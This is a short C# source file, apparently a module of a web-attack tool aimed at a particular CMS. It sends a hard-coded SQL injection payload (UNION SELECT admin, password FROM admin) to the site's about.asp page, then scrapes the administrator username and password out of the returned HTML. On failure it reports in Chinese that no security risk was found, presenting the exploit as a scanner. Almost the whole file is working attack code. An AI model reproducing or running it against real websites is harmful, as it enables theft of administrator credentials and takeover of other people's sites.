using System;
using System.Net;
namespace windowsmanger
{
	internal class w78cms
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string exp = "/about.asp?id=2%20and%201=2%20union%20select%201,admin,3,password,5,6%20from%20admin";
				WebClient cli = new WebClient();
				string shuju = cli.DownloadString(urls + exp);
				string shuju2 = shuju.Substring(shuju.IndexOf("</SPAN></TD></TR></TBODY></TABLE>") - 50, 50);
				string shuju3 = shuju.Substring(shuju.IndexOf("</SPAN></TD></TR></TBODY></TABLE>") + 33, 300);
				string name = shuju2.Substring(shuju2.IndexOf("\">") + 2, 48 - shuju2.IndexOf("\">"));
				string pass = shuju3.Substring(shuju3.Length - 35, 35);
				result = name + "+++" + pass;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
